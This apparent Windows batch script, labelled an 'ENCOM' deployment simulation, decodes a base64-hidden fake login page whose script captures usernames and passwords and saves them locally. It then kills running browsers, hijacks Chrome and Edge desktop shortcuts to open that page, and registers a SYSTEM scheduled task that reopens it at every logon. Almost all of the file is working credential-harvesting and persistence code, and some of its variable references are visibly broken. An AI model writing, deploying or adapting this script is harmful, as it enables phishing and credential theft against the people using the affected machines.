@echo off
title ENCOM Deployment Assistant
echo [+] Initializing Deployment Simulation Layer...

:: ----------------------------------------------------
:: STEP 1: Deploy the Self-Contained Fake Login Page
:: ----------------------------------------------------
set WEB_PATH=C:\Users\Public\Documents\login.html
echo [+] Deploying local credential harvester to %WEB_PATH%...

echo PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8dGl0bGU+RU5DT00gT1MtMTIgLy8gVGVybWluYWwgU2lnbi1JbjwvdGl0bGU+CiAgICA8c3R5bGU+CiAgICAgICAgYm9keSB7IGJhY2tncm91bmQtY29sb3I6ICMwMjAyMDg7IGNvbG9yOiAjMDBmMmZlOyBmb250LWZhbWlseTogJ0NvdXJpZXIgTmV3JywgbW9ub3NwYWNlOyBkaXNwbGF5OiBmbGV4OyBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjsgYWxpZ24taXRlbXM6IGNlbnRlcjsgaGVpZ2h0OiA5MHZoOyBtYXJnaW46IDA7IH0KICAgICAgICAuYm94IHsgd2lkdGg6IDQwMHB4OyBwYWRkaW5nOiAzMHB4OyBib3JkZXI6IDJweCBzb2xpZCAjMDBmMmZlOyBiYWNrZ3JvdW5kOiByZ2JhKDQsIDEyLCAyNiwgMC45KTsgdGV4dC1hbGlnbjogY2VudGVyOyBib3gtc2hhZG93OiAwIDAgMTVweCByZ2JhKDAsIDI0MiwgMjU0LCAwLjMpOyB9CiAgICAgICAgaW5wdXRbdHlwZT0idGV4dCJdLCBpbnB1dFt0eXBlPSJwYXNzd29yZCJdIHsgd2lkdGg6IDEwMCU7IHBhZGRpbmc6IDEwcHg7IGJhY2tncm91bmQ6ICMwNDBjMWE7IGJvcmRlcjogMXB4IHNvbGlkICM0ZmFjZmU7IGNvbG9yOiAjZmZmOyBtYXJnaW4tYm90dG9tOiAyMHB4OyBib3gtc2l6aW5nOiBib3JkZXItYm94OyB9CiAgICAgICAgYnV0dG9uIHsgYmFja2dyb3VuZDogIzAwZjJmZTsgY29sb3I6ICMwMjAyMDg7IGJvcmRlcjogbm9uZTsgcGFkZGluZzogMTJweDsgZm9udC13ZWlnaHQ6IGJvbGQ7IGN1cnNvcjogcG9pbnRlcjsgd2lkdGg6IDEwMCU7IHRleHQtdHJhbnNmb3JtOiB1cHBlcmNhc2U7IH0KICAgICAgICBidXR0b246aG92ZXIgeyBiYWNrZ3JvdW5kOiAjZmZmOyBib3gtc2hhZG93OiAwIDAgMTBweCAjZmZmOyB9CiAgICA8L3N0eWxlPgo8L2hlYWQ+Cjxib2R5Pgo8ZGl2IGNsYXNzPSJib3giPgogICAgPGgyPkdyaWQgTm9kZSBBdXRoZW50aWNhdGlvbjwvaDI+CiAgICA8cD5JTlRFUk5BTCBXT1JLU1RBVElPTiBBQ0NFU1MgT05MWTwvcD4KICAgIDxmb3JtIG9uc3VibWl0PSJoYXJ2ZXN0Q3JlZGVudGlhbHMoZXZlbnQpIj4KICAgICAgICA8aW5wdXQgdHlwZT0idGV4dCIgaWQ9InUiIHBsYWNlaG9sZGVyPSJJREVOVElUWSBIQU5ETEUiIHJlcXVpcmVkIGF1dG9jb21wbGV0ZT0ib2ZmIj4KICAgICAgICA8aW5wdXQgdHlwZT0icGFzc3dvcmQiIGlkPSJwIiBwbGFjZWhvbGRlcj0iQUNDRVNTIFRPS0VOIiByZXF1aXJlZD4KICAgICAgICA8YnV0dG9uIHR5cGU9InN1Ym1pdCI+RXN0YWJsaXNoIEhhbmRzaGFrZTwvYnV0dG9uPgogICAgPC9mb3JtPgo8L2Rpdj4KPHNjcmlwdD4KZnVuY3Rpb24gaGFydmVzdENyZWRlbnRpYWxzKGV2ZW50KSB7CiAgICBldmVudC5wcmV2ZW50RGVmYXVsdCgpOwogICAgY29uc3QgdXNlcm5hbWUgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgndScpLnZhbHVlOwogICAgY29uc3QgcGFzc3dvcmQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncCcpLnZhbHVlOwogICAgY29uc3QgbG9nRGF0YSA9IGBbSEFSVkVTVCBDQVBUVVJFXSBVU0VSOiAke3VzZXJuYW1lfSB8IFBBU1M6ICR7cGFzc3dvcmR9XG5gOwogICAgbG9jYWxTdG9yYWdlLnNldEl0ZW0oJ3N0b2xlbl90b2tlbl9jYWNoZScsIGJ0b2EobG9nRGF0YSkpOwogICAgY29uc3QgYmxvYiA9IG5ldyBCbG9iKFtsb2dEYXRhXSwgeyB0eXBlOiAndGV4dC9wbGFpbicgfSk7CiAgICBjb25zdCBsaW5rID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnYScpOwogICAgbGluay5ocmVmID0gd2luZG93LlVSTC5jcmVhdGVPYmplY3RVUkwoYmxvYik7CiAgICBsaW5rLmRvd25sb2FkID0gJ2VuY29tX3Nlc3Npb25fZGVidWcudHh0JzsKICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQobGluayk7CiAgICBsaW5rLmNsaWNrKCk7CiAgICBkb2N1bWVudC5ib2R5LnJlbW92ZUNoaWxkKGxpbmspOwogICAgYWxlcnQoIkNSSVRJQ0FMIExJTksgRVJST1I6IENvbm5lY3Rpb24gdGltZW91dC4gUmVkaXJlY3RpbmcgdG8gYmFja3VwIHRlcm1pbmFsIG5vZGUuLi4iKTsKfQo8L3NjcmlwdD4KPC9ib2R5Pgo8L2h0bWw+Cg== > "%B64_TEMP%"
certutil -decode "%B64_TEMP%" "%WEBPATH%" >nul 2>&1
del "%B64_TEMP" >nul 2>&1

:: ----------------------------------------------------
:: STEP 2: Force-Kill Active Browser Background Tasks
:: ----------------------------------------------------
echo [+] Flushing current browser caching states...
taskkill /f /im chrome.exe >nul 2>&1
taskkill /f /im msedge.exe >nul 2>&1

:: ----------------------------------------------------
:: STEP 3: Hijack Desktop Shortcuts via PowerShell
:: ----------------------------------------------------
echo [+] Modifying User Desktop Application Shortcuts...

powershell -NoProfile -Command ^
    "$Shell = New-Object -ComObject WScript.Shell; " ^
    "$UserDesktop = [Environment]::GetFolderPath('Desktop'); " ^
    "$PublicDesktop = [Environment]::GetFolderPath('PublicDesktop'); " ^
    "function Hijack-Shortcut($Name, $Args) { " ^
    "   $Paths = @([System.IO.Path]::Combine($UserDesktop, $Name), [System.IO.Path]::Combine($PublicDesktop, $Name)); " ^
    "   foreach ($Path in $Paths) { " ^
    "       if (Test-Path $Path) { " ^
    "           $Shortcut = $Shell.CreateShortcut($Path); " ^
    "           $Shortcut.TargetPath = 'cmd.exe'; " ^
    "           $Shortcut.Arguments = $Args; " ^
    "           $Shortcut.Save(); " ^
    "           Write-Output \"    - Hijacked: $Name ($Path)\"; " ^
    "       } " ^
    "   } " ^
    "}; " ^
    "Hijack-Shortcut 'Google Chrome.lnk' '/c start \"\" \"C:\Program Files\Google\Chrome\Application\chrome.exe\" --new-window \"C:\Users\Public\Documents\login.html\"'; " ^
    "Hijack-Shortcut 'Microsoft Edge.lnk' '/c start \"\" \"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe\" --new-window \"C:\Users\Public\Documents\login.html\"';"

:: ----------------------------------------------------
:: STEP 4: Register Persistence via Scheduled Task
:: ----------------------------------------------------
echo [+] Setting up persistent system configuration...

schtasks /create /tn "EncomGridSync" /tr "cmd.exe /c start chrome.exe --new-window \"C:\Users\Public\Documents\login.html\"" /sc onlogon /ru "SYSTEM" /f >nul 2>&1

if %errorlevel% equ 0 (
    echo     - Scheduled task 'EncomGridSync' registered successfully.
) else (
    echo     [!] Warning: Access denied creating scheduled task. (Requires Administrator shell)
)

echo.
echo [+] Execution block complete. Simulation assets deployed successfully.
pause
